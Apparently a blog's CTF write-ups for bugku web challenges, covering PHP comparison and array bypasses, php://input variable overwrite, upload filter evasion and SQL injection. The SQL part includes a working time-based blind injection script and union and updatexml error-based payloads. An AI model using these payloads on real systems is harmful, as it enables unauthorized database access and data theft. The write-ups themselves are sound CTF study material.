Tips:isset()函数如果一次传入多个参数，只有参数全被设置且非空的情况下才返回TRUE，isset()函数对数组中的元素同样适用。 file_get_contents() 变量覆盖的意思就是让自己上传的变量值覆盖原有的变量值 这里值得注意的是 $shiyan==$content,而content的值来自于函数自己建的$flag变量，所以这题目的变量覆盖实际是覆盖$flag的值，让flag的值和shiyan的值相同 可以用空值的方法使二者想等即 ?shiyan=&amp;flag= strcmp比较字符串http://123.206.87.240:9009/6.php &lt;?php $flag = &quot;flag&#123;xxxxx&#125;&quot;; if (isset($_GET[&#x27;a&#x27;])) &#123; if (strcmp($_GET[&#x27;a&#x27;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写） die(&#x27;Flag: &#x27;.$flag); else print &#x27;No&#x27;; &#125; ?&gt; 题目给的注释很清楚的给出了获得flag的条件。。。 先了解一下 strcmp()的两个参数都必须是字符串类型的，但是如果传递一个非字符穿类型的参数进去，例如数组，则函数就会报错，其返回值就为0。满足 if (strcmp($_GET[&#39;a&#39;], $flag) == 0) 即可获得flag url:http://123.206.87.240:9009/6.php?a[]= urldecode二次编码绕过题目说的很清楚了，二次编码绕过 if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123; echo(&quot; not allowed! &quot;); PHP 函数 eregi() 语法 int eregi(string pattern, string string, [array regs]); 定义和用法 eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。Eregi()可以特别有用的检查有效性字符串,如密码。 可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。 返回值 如果匹配成功返回true,否则,则返回false 这里进行了过滤，传的值不能为hackerDJ $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;hackerDJ&quot;) //要编码的字符串hackerDJ GET会提交时进行一次urlencode urldecode()于urlencode()是一对想反作用的函数，一个解码一个编码。 $_GET[id] = urldecode($_GET[id]) urldecode后的$_GET[id] 复制给自己等于hackerDJ 所以对hackerDJ 进行两次urlencode, 为了绕过过滤；进行一次urldecode后其值和hackerDJ相等，得到flag ?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41 md5()函数&lt;?php error_reporting(0); $flag = &#x27;flag&#123;test&#125;&#x27;; if (isset($_GET[&#x27;username&#x27;]) and isset($_GET[&#x27;password&#x27;])) &#123; if ($_GET[&#x27;username&#x27;] == $_GET[&#x27;password&#x27;]) print &#x27;Your password can not be your username.&#x27;; else if (md5($_GET[&#x27;username&#x27;]) === md5($_GET[&#x27;password&#x27;])) die(&#x27;Flag: &#x27;.$flag); else print &#x27;Invalid password&#x27;; &#125; ?&gt; 利用md5不能处理数组的特性绕过 md5() md5函数遇到数组类型的参数时，返回值为null，null===null,所以满足md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;] GET: /?username[]=1&amp;password[]=2 数组返回NULL绕过&lt;?php $flag = &quot;flag&quot;; if (isset ($_GET[&#x27;password&#x27;])) &#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) //进行过滤，password必须包含字母和数字 echo &#x27;You password must be alphanumeric&#x27;; else if (strpos ($_GET[&#x27;password&#x27;], &#x27;--&#x27;) !== FALSE) die(&#x27;Flag: &#x27; . $flag); else echo &#x27;Invalid password&#x27;; &#125; ?&gt; 提示是数组返回NULL 直接尝试提交?password[]=，flag就出来了 了解一下原理， 代码相关知识点链接如下： isset函数：http://php.net/manual/zh/function.isset.php ereg函数：http://www.php.net/manual/zh/function.ereg.php strpos函数：http://www.w3school.com.cn/php/func_string_strpos.asp “[A-Za-z0-9]”方括号表示字符集，[A-Za-z0-9]匹配大小写字母和数字其中一个字符 “^[A-Za-z0-9]$”^表示字符串开始，$表示字符串结束 ，这个匹配只有一个大小写字母和数字字符的字符串 “^[A-Za-z0-9]+$”+号表示重复1到多次，匹配由多个数字大小字母组成的字符串 值得注意的是这两个函数能处理的参数都是string类型 ereg只能处理字符，r如果数组，则返回的是null，三个等号的时候不会进行类型转换。所以null不等于false。 strpos的参数同样不能够是数组，所以返回的依旧是null，null不等于false也是正确。 故?password[]=可以绕过。 但是还有一种为%00截断 ?password=d%00-- 弱类型整数大小比较绕过$temp = $_GET[&#x27;password&#x27;]; is_numeric($temp)?die(&quot;no numeric&quot;):NULL; if($temp&gt;1336)&#123; echo $flag; 题目说了弱类型比较绕过 payload： password=1444b 首先在is_numeric()检查时，因为1444b中包含了字母b所以不会认为是数字类型 在判断是否大于1336时，php默认1444b是数字类型，所以大于1336 sha()函数比较绕过&lt;?php $flag = &quot;flag&quot;; if (isset($_GET[&#x27;name&#x27;]) and isset($_GET[&#x27;password&#x27;])) &#123; var_dump($_GET[&#x27;name&#x27;]); echo &quot;&quot;; var_dump($_GET[&#x27;password&#x27;]); var_dump(sha1($_GET[&#x27;name&#x27;])); var_dump(sha1($_GET[&#x27;password&#x27;])); if ($_GET[&#x27;name&#x27;] == $_GET[&#x27;password&#x27;]) echo &#x27;Your password can not be your name!&#x27;; else if (sha1($_GET[&#x27;name&#x27;]) === sha1($_GET[&#x27;password&#x27;])) die(&#x27;Flag: &#x27;.$flag); else echo &#x27;Invalid password.&#x27;; &#125; else echo &#x27;Login first!&#x27;; ?&gt; 代码逻辑很简单，首先判断是否get方式传递name和password参数 var_dump，输出参数类型和值 之后如果通过if判断则可以拿到flag if判断的条件 name和password不能相同 但是sha1(name)===sha1(password) 这里可以使用sha1函数无法处理数组的漏洞绕过，sha1遇到参数为数组类型时返回值为0 payload： GET: ?name[]=1&amp;password[]=2 md5加密相等绕过&lt;?php $md51 = md5(&#x27;QNKCDZO&#x27;); $a = @$_GET[&#x27;a&#x27;]; $md52 = @md5($a); if(isset($a))&#123; if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123; echo &quot;flag&#123;*&#125;&quot;; &#125; else &#123; echo &quot;false!!!&quot;; &#125; &#125; else &#123; echo &quot;please input a&quot;; &#125; ?&gt; 即使用get方式传递一个参数a,使得a的值不等于QNKCDZO但是二者的md5值相同 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 常见的payload有 QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a //下面是sha1()加密后 ==相等的字符串 sha1(str) sha1(&#x27;aaroZmOk&#x27;) sha1(&#x27;aaK1STfY&#x27;) sha1(&#x27;aaO8zKZF&#x27;) sha1(&#x27;aa3OFF9m&#x27;) payload: GET: ?a=240610708 十六进制与数字比较&lt;?php error_reporting(0); function noother_says_correct($temp) &#123; $flag = &#x27;flag&#123;test&#125;&#x27;; $one = ord(&#x27;1&#x27;); //ord — 返回字符的 ASCII 码值 $nine = ord(&#x27;9&#x27;); //ord — 返回字符的 ASCII 码值 $number = &#x27;3735929054&#x27;; // Check all the input characters! for ($i = 0; $i &lt; strlen($number); $i++) &#123; // Disallow all the digits! $digit = ord($temp&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; // Aha, digit not allowed! return &quot;flase&quot;; &#125; &#125; if($number == $temp) return $flag; &#125; $temp = $_GET[&#x27;password&#x27;]; echo noother_says_correct($temp); ?&gt; 重点在这段代码 if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; // Aha, digit not allowed! return &quot;flase&quot;; &#125; &#125; if($number == $temp) return $flag; &#125; 输入的数字中不能包含1-9的数字 如果输入的数字和相等则拿到flag 可以想到的是将这段数字转换为十六进制 hex(3735929054)=0xdeadc0de GET: password=0xdeadc0de 变量覆盖网址打不开 ereg正则%00截断&lt;?php $flag = &quot;xxx&quot;; if (isset ($_GET[&#x27;password&#x27;])) &#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) &#123; echo &#x27;You password must be alphanumeric&#x27;; &#125; else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) &#123; if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) //strpos — 查找字符串首次出现的位置 &#123; die(&#x27;Flag: &#x27; . $flag); &#125; else &#123; echo(&#x27;- have not been found&#x27;); &#125; &#125; else &#123; echo &#x27;Invalid password&#x27;; &#125; &#125; ?&gt; 绕过三个if语句即可拿到flag 第一个 if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) 这个比较常见的正则表达式，也很容易理解 [a-zA-Z0-9]+包含大小写字符和数字，^是匹配开始标志，$是匹配结束标志 第二个 if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) password字段长度小于8，但是大于9999999，可以使用科学计数法 第三个 if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) password要包含 -（做题的时候会发现应该是*-*） payload GET: password=1e9%00*-* strpos数组绕过&lt;?php $flag = &quot;flag&quot;; if (isset ($_GET[&#x27;ctf&#x27;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;ctf&#x27;]) === FALSE) echo &#x27;必须输入数字才行&#x27;; else if (strpos ($_GET[&#x27;ctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE) die(&#x27;Flag: &#x27;.$flag); else echo &#x27;骚年，继续努力吧啊~&#x27;; &#125; ?&gt; 直接利用ereg和strpos函数不能处理数组的特性绕过 当输入ctf[]=11时，ereg返回值null!==FALSE strpos返回值也为null!=FALSE 拿到flag payload： GET: ?ctf[]=111 //正常做法 ?nctf=1%00%23biubiubiu 数字验证正则绕过&lt;?php error_reporting(0); $flag = &#x27;flag&#123;test&#125;&#x27;; if (&quot;POST&quot; == $_SERVER[&#x27;REQUEST_METHOD&#x27;]) &#123; $password = $_POST[&#x27;password&#x27;]; if (0 &gt;= preg_match(&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;, $password)) //preg_match — 执行一个正则表达式匹配 长度大于12 &#123; echo &#x27;flag&#x27;;//这里输出的是假flag 真的在下面 exit; &#125; while (TRUE) &#123; $reg = &#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array(&#x27;punct&#x27;, &#x27;digit&#x27;, &#x27;upper&#x27;, &#x27;lower&#x27;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 foreach ($ps as $pt) &#123; if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; &#125; if ($c &lt; 3) break; //&gt;=3，必须包含四种类型三种与三种以上 if (&quot;42&quot; == $password) echo $flag; else echo &#x27;Wrong password&#x27;; exit; &#125; &#125; ?&gt; 代码还挺长，但是直接抓住重点 if (0 &gt;= preg_match(&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;, $password)) [:graph]是所有可打印的字符,{12,},是在password中匹配12次以上，即password的长度大于12 下面的正则 $ps = array(&#x27;punct&#x27;, &#x27;digit&#x27;, &#x27;upper&#x27;, &#x27;lower&#x27;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 foreach ($ps as $pt) &#123; if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; &#125; 要求password中必须包含三种以上的类型的字符，于是正常构造如下的payload POST: password=42adad;d;;a //非正常的 password=42%00 或者POST一个任意不等于password的字符 暂时不知道什么原因导致的 简单waf网址打不开","tags":[{"name":"变量覆盖","slug":"变量覆盖","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"name":"函数漏洞","slug":"函数漏洞","permalink":"https://sunzhengyu99.github.io/tags/%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/"},{"name":"绕过","slug":"绕过","permalink":"https://sunzhengyu99.github.io/tags/%E7%BB%95%E8%BF%87/"}]},{"title":"bugku刷题记录2","date":"2020-09-10T01:05:12.000Z","path":"2020/09/10/bugku1/","text":"bugku刷题记录2 速度要快打开页面查看源码什么也没有 抓包看了看，惊喜的发现了flag字段 一段base64 解码后为NDQyMDIy 提交发现并不对。。。看来另有玄机 多go几次后发现了flag值一直在变，并且有一段提示 &lt;!-- OK ,now you have to post the margin what you find --&gt; 用post方法提交你所发现的内容，只好使用脚本（不会写） import requests import base64 url=&quot;http://120.24.86.145:8002/web6/&quot; r=requests.session() headers=r.get(url).headers#因为flag在消息头里 mid=base64.b64decode(headers[&#x27;flag&#x27;]) mid=mid.decode()#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的 flag = base64.b64decode(mid.split(&#x27;:&#x27;)[1])#获得flag:后的值 data=&#123;&#x27;margin&#x27;:flag&#125; print (r.post(url,data).text)#post方法传上去 cookie欺骗注意观察urlhttp://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ= line=2&amp;filename=a2V5cy50eHQ= a2V5cy50eHQ= 解密是为key.txt line是行的意思，这里应该是查看key.txt的第line行的代码 这里可以查看index.php源码 index.php的base64值为aW5kZXgucGhw 改变line的值可以一行一行的查看源码，可以使用脚本 import requests url1 = &quot;http://123.206.87.240:8002/web11/index.php?line=&quot; url2 = &quot;&amp;filename=aW5kZXgucGhw&quot; mysession = requests.session() for i in range(0, 40): r = mysession.get(url1+str(i)+url2) print(r.text) &lt;?php error_reporting(0); $file=base64_decode(isset($_GET[&#x27;filename&#x27;])?$_GET[&#x27;filename&#x27;]:&quot;&quot;); $line=isset($_GET[&#x27;line&#x27;])?intval($_GET[&#x27;line&#x27;]):0; if($file==&#x27;&#x27;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;); $file_list = array( &#x27;0&#x27; =&gt;&#x27;keys.txt&#x27;, &#x27;1&#x27; =&gt;&#x27;index.php&#x27;, ); if(isset($_COOKIE[&#x27;margin&#x27;]) &amp;&amp; $_COOKIE[&#x27;margin&#x27;]==&#x27;margin&#x27;)&#123; //看这里 $file_list[2]=&#x27;keys.php&#x27;; &#125; if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line]; &#125; ?&gt; if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;) 这里可以判断cookie必须满足margin=margin才能访问keys.php never give up查看源码提示了 &lt;!--1p.html--&gt; 直接访问1p.html,发现直接跳转到了bugku的主页，先看源码，发现一段编码应该是base64 JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ base64解码后为url编码 %22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E url解码为源码 &lt;?php f(!$_GET[&#x27;id&#x27;]) &#123; header(&#x27;Location: hello.php?id=1&#x27;); exit(); &#125; $id=$_GET[&#x27;id&#x27;]; $a=$_GET[&#x27;a&#x27;]; $b=$_GET[&#x27;b&#x27;]; if(stripos($a,&#x27;.&#x27;)) &#123; echo &#x27;no no no no no no no&#x27;; return ; &#125; $data = @file_get_contents($a,&#x27;r&#x27;); if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4) &#123; require(&quot;f4l2a3g.txt&quot;); //注意这里，flag应该藏在这里 &#125; else &#123; print &quot;never never never give up !!!&quot;; &#125; ?&gt; 果然藏在f4l2a3g.txt 过狗一句话此站没有flag，flag被人删了，不用再做了。–一个做题的路人 flag好像真的被删了，列不出来目录，查看wp也没有复现。 正则？字符？ &lt;?php highlight_file(&#x27;2.php&#x27;); $key=&#x27;KEY&#123;********************************&#125;&#x27;; $IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match); if( $IM )&#123; die(&#x27;key is: &#x27;.$key); &#125; preg_match(&quot;/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match); 重点在这句话上，考点为正则表达式 定界符：/和/（一般来说是这两个，其实除了\\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）； . （一个点）：表示可以匹配任何字符； * ：前面的字符重复零次或多次； {n,m} ：前面的字符重复4~7次； \\ （反斜线）：后面的字符被转义； [a-z] ：在a到z中匹配 ； [[:punct:]] ：匹配任何标点符号； /i ：表示这个正则表达式对大小写不敏感； 因此可以写出符合要求的字符穿 keyakey22222key:/a/aaakeyb! 前女友(SKCTF)题目网址打不开 login1(SKCTF)题目网址打不开 你从哪里来题目提示 are you from google? 你是从google来的吗 考察http头中的referer参数 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。例如：Referer：http://www.sina.com/ 那么就抓包修改referer这个参数 Referer: https://www.google.com/,直接go即可 md5 collision源码 $md51 = md5(&#x27;QNKCDZO&#x27;); $a = @$_GET[&#x27;a&#x27;]; $md52 = @md5($a); if(isset($a))&#123; if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123; echo &quot;nctf&#123;*****************&#125;&quot;; &#125; else &#123; echo &quot;false!!!&quot;; &#125;&#125; else&#123;echo &quot;please input a&quot;;&#125; 即使用get方式传递一个参数a,使得a的值不等于QNKCDZO但是二者的md5值相同 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 常见的payload有 QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a sha1(str) sha1(&#x27;aaroZmOk&#x27;) sha1(&#x27;aaK1STfY&#x27;) sha1(&#x27;aaO8zKZF&#x27;) sha1(&#x27;aa3OFF9m&#x27;) 程序员本地网站见到题目就想到了x-forwarded-for，本地地址可以使用IP:127.0.0.1 可以使用google浏览器的插件 各种绕过题目源码 &lt;?php highlight_file(&#x27;flag.php&#x27;); $_GET[&#x27;id&#x27;] = urldecode($_GET[&#x27;id&#x27;]); $flag = &#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;; if (isset($_GET[&#x27;uname&#x27;]) and isset($_POST[&#x27;passwd&#x27;])) &#123; if ($_GET[&#x27;uname&#x27;] == $_POST[&#x27;passwd&#x27;]) print &#x27;passwd can not be uname.&#x27;; else if (sha1($_GET[&#x27;uname&#x27;]) === sha1($_POST[&#x27;passwd&#x27;])&amp;($_GET[&#x27;id&#x27;]==&#x27;margin&#x27;)) die(&#x27;Flag: &#x27;.$flag); else print &#x27;sorry!&#x27;; &#125; ?&gt; 首先看一下要传入哪些变量 get:id uname post:passwd id需要进行一次urldecode，解码的值为margin uname与passwd不相同，但是sha1值要相同，并且是严格相等 ===，这里可以使用sha1函数的漏洞，无法处理数组类型的变量，最后会返回0，也可以用sha1强碰撞。 payload urlencode(margin)=%6D%61%72%67%69%6E uname[]=1 passwd[]=2 GET: id=%6D%61%72%67%69%6E&amp;uname[]=1 POST:passwd[]=2 web8&lt;?php extract($_GET); if (!empty($ac)) &#123; $f = trim(file_get_contents($fn)); if ($ac === $f) &#123; echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;; &#125; else &#123; echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;; &#125; &#125; ?&gt; extract函数作用 (PHP 4, PHP 5, PHP 7) extract — 从数组中将变量导入到当前的符号表 说明 extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] ) : int 本函数用来将变量从数组中导入到当前的符号表中。 检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。 trim (PHP 4, PHP 5, PHP 7) trim — 去除字符串首尾处的空白字符（或者其他字符） 说明 trim ( string $str [, string $character_mask = “ \\t\\n\\r\\0\\x0B” ] ) : string 此函数返回字符串 str 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符： “ “ (ASCII 32 (0x20))，普通空格符。 “\\t” (ASCII 9 (0x09))，制表符。 “\\n” (ASCII 10 (0x0A))，换行符。 “\\r” (ASCII 13 (0x0D))，回车符。 “\\0” (ASCII 0 (0x00))，空字节符。 “\\x0B” (ASCII 11 (0x0B))，垂直制表符。 file_get_contents (PHP 4 &gt;= 4.3.0, PHP 5, PHP 7) file_get_contents — 将整个文件读入一个字符串 代码的大致含义就是 get方式提交参数，用extract函数将变量写入符号表中，如果get提交的参数中包含$ac，则利用file_get_content函数从文件中读取内容并赋值给$f,如果$ac===$f则拿到flag 这里需要利用php的伪协议写入内容 php://input payload GET: ac=111&amp;fn=php://input POST: 111 细心题目网站崩了 求getshell文件上传 首先先上传一个图片文件，上传成功了并返回保存路径 再上传一个php的文件，提示Invalid file 上传.htaccess, .user.ini都提示you got it 两种提示不一样猜测可能存在后缀黑名单和文件类型检测。 上传一个php5文件并bp抓包修改MIME(Content-Type)为 image/.jpeg还是提示invalid file 再修改请求头部的Content-Type，利用大小写绕过，成功拿到flag 考察知识点： 请求中的Content-Type 在请求中 (如POST 或 PUT)，Content-Type字段用于客户端告诉服务器实际发送的数据类型。当你发送一个HTTP的POST请求时，需要设置请求头中的Content-Type字段，告诉服务端你发送的数据是什么类型的。 设置请求头中的Content-Type 当客户端向服务端发起HTTP的POST请求时，需要告诉服务端，我们发送的数据类型，方便服务端去解析数据。如果你不设置，那么服务端可能无法处理你的请求。 INSERT INTO注入提示了insert into注入 并给出了源码 &lt;?php error_reporting(0); function getIp()&#123; $ip = &#x27;&#x27;; if(isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]))&#123; //判断是否存在xxf $ip = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]; //存在则优先使用xxf &#125;else&#123; $ip = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; //remote_addr &#125; $ip_arr = explode(&#x27;,&#x27;, $ip); //过滤 , return $ip_arr[0]; &#125; $host=&quot;localhost&quot;; $user=&quot;&quot;; $pass=&quot;&quot;; $db=&quot;&quot;; $connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);//连接数据库 mysql_select_db($db) or die(&quot;Unable to select database&quot;); $ip = getIp(); echo &#x27;your ip is :&#x27;.$ip; $sql=&quot;insert into client_ip (ip) values (&#x27;$ip&#x27;)&quot;; //注入点 mysql_query($sql); ?&gt; 网页显示出自己的ip地址，想到的是xff头，修改了xff头的内容后，页面回显也会改变，所以就是xff注入。 抓包添加xxf头，并构造注入语句,这里因为过滤了逗号，所以无法使用if语句，又因为没有回显所以要使用基于时间的盲注 $ip_arr = explode(&#x27;,&#x27;, $ip); //过滤了, 代替if的注入语句如下 select case when 语句1 then 语句2 else 语句3 end; //含义很好理解，就是当语句1为真时，执行语句2，否则执行语句3 所以要构造的注入语句为 11&#x27;+(select case when length(database())=5 then sleep(5) else 0 end))%23 //当数据库名的长度为5时，则执行sleep(5)，否则结束，这样就可以根据网页的响应时间来判断查询语句是否正确 带入原语句 insert into client_ip (ip) values (&#x27;$ip&#x27;) insert into client_ip (ip) values (&#x27;11&#x27;+(select case when length(database())=5 then sleep(5) else 0 end))%23 //可以看到语句成功注入到原查询语句中，并可以正常执行 判断字段每一个字符的值 常用的语句应该为 1&#x27; and (case when (substr(select database()),1,1)=&#x27;c&#x27; then sleep(5) else 1 end) # 但是因为逗号被过滤了，所以改为下面的语句 1&#x27; and (case when (substr(select database()) from 1 for 1)=&#x27;c&#x27; then sleep(5) else 1 end) # # -*- coding:utf-8 -*- import requests import sys #sql = &#x27;127.0.0.1&#x27;+(select case when substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27;) then sleep(5) else 0 end) --+ ##client_ip,flag #sql = &#x27;127.0.0.1&#x27;+(select case when substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27;) then sleep(5) else 0 end) --+ sql = &quot;127.0.0.1&#x27;+(select case when substr((select flag from flag) from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27; then sleep(5) else 0 end))-- +&quot; url = &#x27;http://123.206.87.240:8002/web15/&#x27; flag = &#x27;&#x27; for i in range(1, 40): print(str(i)) for ch in range(32, 129): if ch == 128: sys.exit(0) sqli = sql.format(i, chr(ch)) header = &#123; &#x27;X-Forwarded-For&#x27;: sqli &#125; try: html = requests.get(url, headers=header, timeout=3) #响应时间超过3秒则 进入except 即可猜测是正确的 except: flag += chr(ch) print(flag) break 这是一个神奇的登陆框网址打不开 多次tips 本题有2个flagflag均为小写flag格式 flag{} 看到题目提示，应该是二次注入 url中存在id参数，再id参数后加 ‘后页面报错，再加上#后显示 There is nothing 输入 id=1’or 1=1–+ 报错 但是输入id=1’oorr 1=1–+ 时正常了，说明存在关键词过滤，通过异或注入发现过滤了union,select,and,or等关键词，可以用双写绕过。 1&#x27;^(length(&#x27;union&#x27;)!=0)--+ 页面显示错误正常说明length(&#x27;union&#x27;)!=0是错的，即length(&#x27;union&#x27;)=0，说明union替换为空了 其他关键词的测试也类似 开始注入 -1&#x27; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+ database:flag1,hint -1&#x27; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;flag1&#x27;--+ table:flag1,address -1&#x27; ununionion seselectlect 1,group_concat(flag1) from flag1 --+ usOwycTju+FTUUzXosjr 解码为：好吧你会SQL注入 -1&#x27; ununionion seselectlect 1,group_concat(address) from flag1 --+ 拿到下一关的地址 同样存在一个注入点id，加单引号发现提示了报错信息，很明显是报错注入 报错注入一般是固定的模板 下面使用updatexml()进行注入 函数语法：updatexml(XML_document, XPath_string, new_value); 适用版本: 5.1.5+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值 我们通常在第二个xpath参数填写我们要查询的内容。 payload 1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;~&#x27;),3) %23 database:~class,flag2~ 